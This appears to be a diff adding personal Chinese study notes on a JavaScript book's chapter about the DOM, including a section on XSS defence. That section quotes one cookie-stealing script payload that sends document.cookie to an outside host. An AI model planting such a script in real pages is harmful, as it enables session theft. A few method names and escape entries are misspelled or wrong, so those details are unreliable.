@@ -1,0 +1,152 @@
+第5章 文档对象类型 p173 2017-12-02 15：27
+5.1、简介
+文档对象类型规定了浏览器应该如何创建HTML页面的模型，以及JavaScript如何访问或修改浏览器窗口中的Web页面的内容。
+DOM既不是HTML的一部分，也不是JavaScript的一部分，而是一系列独立的规则。所有主流的浏览器厂商都实现了这些规则，规则主要分为两个方面：
+	规定HTML页面的模型；
+		当浏览器加载Web页面时，会在内存中创建页面的模型；
+		DOM规定了浏览器应该使用DOM树的方式创建这个模型；
+		DOM被称为“对象模型”是因为这个模型（DOM树）是由一些对象组成的；
+		每个对象都会作为页面的不同部分被加载到浏览器窗口中。
+	访问和修改HTML页面；
+		DOM同样定义了一些方法和属性，用于访问和修改模型中的对象，用户最终会在浏览器中看到这些修改。
+		人们把DOM称为API。
+5.2、DOM树的四类节点
+	文档节点
+		整棵树的顶点就是文档节点，它呈现为整个页面（相当于document对象），当需要访问任何元素、属性或者文本节点时，都需要通过文档节点来进行导航；
+	元素节点
+		HTML元素描述了HTML页面的结构；
+	属性节点
+		HTML元素的开始标签中可以包含若干属性，这些属性在DOM树中形成属性节点；属性节点不是所在元素的子节点，而是元素的一部分；
+	文本节点
+		当访问元素节点时，可以访问元素内部的文本，这些文本保存在其文本节点中，文本节点没有子节点。
+5.3、使用DOM树
+5.3.1、访问元素
+	选择单个元素：
+		getElementById() 使用元素ID来选择，元素ID应该在页面唯一；
+		querySelector() 使用CSS选择器，返回第一个匹配的元素；
+	选择多个元素：
+		getElementByClassName() 选择所有在class属性中使用了特定值的元素；
+		getElementByTagName()  选择所有使用了指定标记的元素；
+		querySelectorAll() 使用CSS选择器来选择所有匹配的元素，慢；
+	在元素节点之间遍历：
+		parentNode 选择当前节点的父节点（只返回一个元素）；
+		previousSibling/nextSibling 选择DOM树中器前一个或者后一个兄弟节点；
+		firstChild/lastChild 返回当前元素的第一个或者最后一个子节点。
+5.3.2、操作这些元素
+	访问/更新文本节点：
+		nodeValue：这个属性允许访问或者修改文本节点中的内容，文本节点不包含任何子元素中的文本。
+	操作HTML内容：
+		innerHTML：可以访问子元素和文本内容。
+		textContent：仅可以访问文本内容。
+		createElment()
+		createTextNode()
+		appendChild()
+		removeChild()：创建节点并添加到树中，以及从树中移除节点。
+	访问或更新属性值：
+		className
+		id：可以用来操作属性
+		hasAttribute()：属性是否存在
+		getAttribute()：获取属性值
+		setAttribute()：更新属性值
+		removeAttribute()：移除属性
+5.4、缓存DOM查询
+因为每次选择都需要解释器在整个DOM树中遍历查找，故缓存这个元素的引用到一个变量中，叫做：选择缓存，其实存放的是这个节点的位置。
+5.5、访问元素
+	元素节点组：
+		如果一个方法可能返回多个节点时，它将一直返回一个NodeList。
+	最快路径：
+		可以通过多种方法查找到一个元素节点，需要用最快路径来减少查询时间，比如使用getElementById()。
+5.6、动态和静态NodeList
+NodeList其实是一个集合，可访问其length长度，item(0)返回第一个元素，更常用的方法是[0]方式访问。
+其有动静态之分，使用getElementBy**的方法返回动态NodeList，当其他脚本更新页面之后，也会反映到这个动态List中；使用query**返回的是静态List，其获取到的是当前的元素状态，如果脚本更新了元素节点，不会反映到这个List中。
+另外使用getElementBy**方法更快些。
+5.7、遍历DOM
+可以通过元素的属性（注意不是方法）来遍历DOM，是：parentNode、previousSibling、nextSibling、firstChild、lastChild来遍历，注意这些属性是只读的，不能更改。
+5.7.1、空白节点
+注意，比如<ul><li></li><li></li></ul>，IE不会再li中间创建空白文本节点，而其他浏览器会。
+5.8、如何获取/更新元素内容
+分为两种节点：
+	一种是纯文本的节点，使用属性nodeValue来访问节点文字；
+	另一种是包含元素，使用属性innerHTML，textContent、innerText来获取或设置文本。
+注意，应该避免使用innerText，因为firefox不支持，且它遵从CSS，不会返回任何被CSS隐藏的内容，例如如果<em>被CSS隐藏，则innerText则读取不到其中的内容，且因为它考虑到布局规则来判断元素的可见性，故速度比textContent慢。
+innerHTML适合一次性大批量的添加元素，而使用DOM操作则适合少量的元素操作，当然后者更加安全，也更慢。
+5.9、更新HTML内容技术比较
+document.write()：
+	不推荐使用；
+element.innerHTML：
+	优点：
+		可使用更少的代码快速添加或删除大量内容；
+	缺点：
+		不应该直接使用用户输入（不安全）；
+		当添加一个很大的DOM片段时，这个方法很难独立区分出每一个元素；
+		事件处理程序可能不像语气那样生效；
+DOM操作：
+	优点：
+		如果DOM片段中拥有大量的兄弟节点，处理其中某一个元素节点时，此方法合适；
+		不会影响事件处理程序；
+		可以轻易的使用脚本来逐步添加元素（非一次性）；
+	缺点：
+		大量快速修改不适合；
+		需要更多的代码。
+5.10、跨网站脚本（XSS）攻击
+一些用户操作的文本，展示到页面上时，可以带有危险的脚本，会泄露你的账户信息。
+比如嵌入一些脚本：<script>var adr = "http://**.com/xss?cookie=" + document.cookie</script>
+解决的办法是不要相信来自客户的输入，一定要校验！在展示用户输入时，一定要转义，作为纯文本输出，而不是html，方法是使用textContent这样的属性。
+永远不要把任何来自用户的内容放到下面这些地方：
+	script标签：<script>not here</script>
+	HTML注释：<!--not here-->
+	标签名：<notHere href="/test" />
+	属性：<div notHere="notHere" />
+	CSS值：{color: not here}
+另外需要转义用户的内容：
+	&	&amp;
+	<	&lt;
+	>	&gt;
+	.	&#x60;
+	'	&#x27;
+	"	&quot;
+	/	&#x2F;
+可使用JavaScript的encodeURIComponent()方法对用户的输入进行编码，该方法会编码如下字符：,	/	?	:	@	&	=	+	$	#
+在显示时将其作为纯文本显示，不要赋给它任何语义：
+	JavaScript：
+		能够使用：textContent或者innerContent
+		不能使用：innerHTML
+	jQuery：
+		能够使用：text()
+		不能使用：.html()
+5.11、属性节点
+在得到一个元素节点后，可在这个元素上使用其他一些对象属性和方法来获取或修改它的HTML属性。
+方法：
+	getAttribute()
+	hasAttribute()
+	setAttribute()
+	removeAttribute()
+属性：
+	className
+	id
+	accessKey
+	checked
+	href
+	lang
+	title
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
